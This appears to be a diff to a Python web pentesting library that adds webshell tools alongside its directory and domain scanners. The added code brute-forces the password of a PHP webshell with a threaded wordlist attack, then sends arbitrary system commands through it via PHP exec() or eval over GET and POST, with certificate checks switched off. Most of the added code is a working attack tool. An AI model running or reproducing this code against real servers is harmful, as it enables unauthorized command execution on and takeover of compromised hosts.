@@ -267,6 +267,163 @@ def get_url_time(url):
     speed = end_time - start_time
     return speed
 
+
+def get_url_ico(url):
+    """
+    :param url: url
+    :return: url ico address
+    """
+    start_time = time.time()
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    response = requests.get(url, headers=browser, verify=False)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    link_tags = soup.find_all('link', rel='shortcut icon')
+    # 遍历 link 标签
+    if link_tags:
+        for link_tag in link_tags:
+            # 取出 ICO 图标的 URL
+            ico_url = link_tag.get('href')
+            if ico_url:
+                return ico_url
+    else:
+        return False
+
+
+def get_webshell_post(url, key):
+    """
+    :param url: url
+    :param key: key
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    shell = "print('test_a_shell');"
+    post_data = f"{key}={shell}"
+    response = requests.post(url, headers=browser, data=post_data, verify=False)
+    if "test_a_shell" in response.text:
+        return True
+    return False
+
+
+def get_webshell_get(url, key):
+    """
+    :param url: url
+    :param key: key
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    shell = "print('test_a_shell');"
+    params = f"{key}={shell}"
+    response = requests.get(url, headers=browser, params=params, verify=False)
+    if "test_a_shell" in response.text:
+        return True
+    return False
+
+
+def get_exec_webshell_get(url, key, shell):
+    """
+    :param url: url
+    :param key: key
+    :param shell: shell
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    sh = f"$output = array();exec('{shell}', $output);print(implode('\n', $output));"
+    params = f"{key}={sh}"
+    response = requests.get(url, headers=browser, params=params, verify=False)
+    return response.text
+
+
+def get_exec_webshell_post(url, key, shell):
+    """
+    :param url: url
+    :param key: key
+    :param shell: shell
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    sh = f"$output = array();exec('{shell}', $output);print(implode('\n', $output));"
+    data = f"{key}={sh}"
+    response = requests.post(url, headers=browser, data=data, verify=False)
+    return response.text
+
+
+def get_eval_webshell_get(url, key, shell):
+    """
+    :param url: url
+    :param key: key
+    :param shell: shell
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    sh = f"{shell}"
+    params = f"{key}={sh}"
+    response = requests.get(url, headers=browser, params=params, verify=False)
+    return response.text
+
+
+def get_eval_webshell_post(url, key, shell):
+    """
+    :param url: url
+    :param key: key
+    :param shell: shell
+    :return: requests seconds
+    """
+    browser = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+        "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}",
+        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers", "Connection": "close"}
+    requests.packages.urllib3.disable_warnings()
+    sh = f"{shell}"
+    data = f"{key}={sh}"
+    response = requests.post(url, headers=browser, data=data, verify=False)
+    return response.text
+
+
 class DirScan:
     def __init__(self, url, threadline=10, sleep_time=0, dirlist=None, return_code=None, echo=False, wait=True, cookies=''):
         """
@@ -421,7 +578,7 @@ class UrlScan:
 class DomainScan:
     def __init__(self, domain, threadline=10, sleep_time=0, domainlist=None, return_code=None, echo=False, wait=True):
         """
-        :param url: Sans URL
+        :param domain: Sans domain
         :param threadline: Thread line
         :param sleep_time: sleep time
         :param dirlist: dirs list
@@ -498,4 +655,64 @@ class DomainScan:
             thread.start()
         if self.wait:
             self.q.join()  # Wait for thread to finish
+        # 如果不等待，也可以直接获取对象中的results、results_code属性
+
+
+class WebShellCracking:
+    def __init__(self, url, threadline=10, sleep_time=0, passlist=None, mode="POST"):
+        """
+        :param url: Shell URL
+        :param threadline: thread line
+        :param sleep_time: sleep_time in seconds
+        :param passlist:  list of passwords
+        :param mode: GET or POST
+        """
+        self.results_title = []
+        self.mode = mode
+        self.q = None
+        self.url = url
+        self.threadline = threadline
+        self.sleep_time = sleep_time
+        self.results = ''
+        self.passlist = passlist
+        self.return_code = [200, 301, 302, 401, 403, 500]  # 默认不返回404，其余需返回，主要为渗透使用。
+        self.run()
+
+    def scan_pass_list(self):
+        if self.passlist:
+            pass  # 如果使用自定义的dirlist,这里不用读取
+        else:
+            package_path = os.path.abspath(os.path.dirname(__file__))
+            file_path = os.path.join(package_path, 'plugin', 'txt', 'shell_weak_password.txt')
+            self.passlist = read_file_to_list(file_path)
+
+    def Cracking_webshell_POST(self):
+        while not self.q.empty():
+            # 从队列中取出密码
+            key = self.q.get()
+            if get_webshell_post(self.url, key):
+                self.results = key
+            self.q.task_done()
+
+    def Cracking_webshell_GET(self):
+        while not self.q.empty():
+            # 从队列中取出密码
+            key = self.q.get()
+            if get_webshell_get(self.url, key):
+                self.results = key
+            self.q.task_done()
+
+    def run(self):
+        self.scan_pass_list()
+        self.q = queue.Queue()  # Create Queue
+        for password in self.passlist:
+            self.q.put(password)
+        for i in range(self.threadline):
+            if self.mode == "GET":
+                thread = threading.Thread(target=self.Cracking_webshell_GET)
+                thread.start()
+            else:
+                thread = threading.Thread(target=self.Cracking_webshell_POST)
+                thread.start()
+        self.q.join()  # Wait for thread to finish
         # 如果不等待，也可以直接获取对象中的results、results_code属性
